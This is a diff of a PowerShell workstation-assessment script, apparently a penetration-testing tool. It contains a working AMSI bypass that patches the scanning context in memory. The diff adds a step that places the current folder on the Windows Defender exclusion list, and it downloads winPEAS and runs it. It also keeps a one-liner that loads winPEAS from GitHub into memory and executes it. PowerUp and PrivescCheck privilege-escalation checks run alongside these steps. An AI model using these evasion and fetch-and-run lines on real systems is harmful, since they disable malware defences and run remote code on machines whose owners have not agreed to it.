@@ -9,8 +9,16 @@ Start-Transcript -path ".\Invoke-WorkstationAssessment.log" -append
 Write-Host '#########################' -BackgroundColor Black
 Write-Host '## Bypassing AMSI      ##' -BackgroundColor Black
 Write-Host '#########################' -BackgroundColor Black
-#### AMSI Bypass
 $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+
+#### Add Exclusion (Defender)
+Write-Host '####################################################' -BackgroundColor Black
+Write-Host '## Add current folder to defender exclusions      ##' -BackgroundColor Black
+Write-Host '####################################################' -BackgroundColor Black
+Write-Host 'Adding the current folder to the defender exclusion list' -ForegroundColor Black -BackgroundColor White
+$currentPath=(Get-Location).Path
+Add-MpPreference -ExclusionPath $currentPath
 
 Write-Host '#########################' -BackgroundColor Black
 Write-Host '## Running PowerUp      ##' -BackgroundColor Black
@@ -29,9 +37,13 @@ Invoke-PrivescCheck -Report PrivescCheck_$env:computername -Format TXT,CSV,HTML,
 Write-Host '######################################' -BackgroundColor Black
 Write-Host '## Running WinPeas                  ##' -BackgroundColor Black
 Write-Host '######################################' -BackgroundColor Black
-Write-Host 'Running Invoke-PrivescCheck and saving HTML output' -ForegroundColor Black -BackgroundColor White
+Write-Host 'Running WinPeas and saving output' -ForegroundColor Black -BackgroundColor White
 # Get latest release
+$currentPath=(Get-Location).Path
 $url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
+wget $url -OutFile $currentPath/winPEASx64.exe
+./winPEASx64.exe log
+
 # One liner to download and execute winPEASany from memory in a PS shell
 $wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")
 
